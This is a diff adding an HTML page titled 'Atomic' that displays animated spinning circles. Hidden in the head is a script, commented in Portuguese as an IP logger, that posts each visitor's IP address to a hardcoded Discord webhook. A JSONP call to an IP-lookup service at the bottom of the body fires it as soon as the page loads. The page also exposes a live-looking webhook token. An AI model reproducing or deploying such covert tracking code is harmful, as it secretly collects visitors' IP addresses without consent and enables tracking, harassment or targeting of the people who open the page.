@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Atomic</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: radial-gradient(circle, #0f0c29, #302b63, #24243e);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .circle-container {
+      position: relative;
+      width: 80vmin;
+      height: 80vmin;
+    }
+
+    .circ1, .circ2, .circ3, .circ4, .circ5, .circ6, .circ7 {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      border: 2px solid #ffffff55;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      animation: spin linear infinite;
+    }
+
+    .circ1 { width: 20vmin; height: 20vmin; animation-duration: 3s; }
+    .circ2 { width: 30vmin; height: 30vmin; animation-duration: 4s; }
+    .circ3 { width: 40vmin; height: 40vmin; animation-duration: 5s; }
+    .circ4 { width: 50vmin; height: 50vmin; animation-duration: 6s; }
+    .circ5 { width: 60vmin; height: 60vmin; animation-duration: 7s; }
+    .circ6 { width: 70vmin; height: 70vmin; animation-duration: 8s; }
+    .circ7 { width: 80vmin; height: 80vmin; animation-duration: 9s; }
+
+    .inner {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+    }
+
+    .inner-circle {
+      width: 2vmin;
+      height: 2vmin;
+      background-color: #00ffff;
+      border-radius: 50%;
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 1vmin #00ffff;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+  </style>
+
+  <script>
+    // Logger de IP safado
+    function getIP(json) {
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1388337122959953970/n-XnVVpBiszcUJkTW0Yuu5doUFxbT8AX4T13WlA9UrdCvwEGlvXpFX8k5PuKvGZw2Q2v");
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "IP Logger",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP capturado:** `" + json.ip + "`\nDexter mandou lembranças 💀"
+      };
+
+      request.send(JSON.stringify(params));
+    }
+  </script>
+</head>
+
+<body>
+  <div class="circle-container">
+    <div class="circ1"><div class="inner"><div class="inner-circle"></div></div></div>
+    <div class="circ2"><div class="inner"><div class="inner-circle"></div></div></div>
+    <div class="circ3"><div class="inner"><div class="inner-circle"></div></div></div>
+    <div class="circ4"><div class="inner"><div class="inner-circle"></div></div></div>
+    <div class="circ5"><div class="inner"><div class="inner-circle"></div></div></div>
+    <div class="circ6"><div class="inner"><div class="inner-circle"></div></div></div>
+    <div class="circ7"><div class="inner"><div class="inner-circle"></div></div></div>
+  </div>
+
+  <!-- Dispara a coleta do IP assim que a página carrega -->
+  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</body>
+</html>
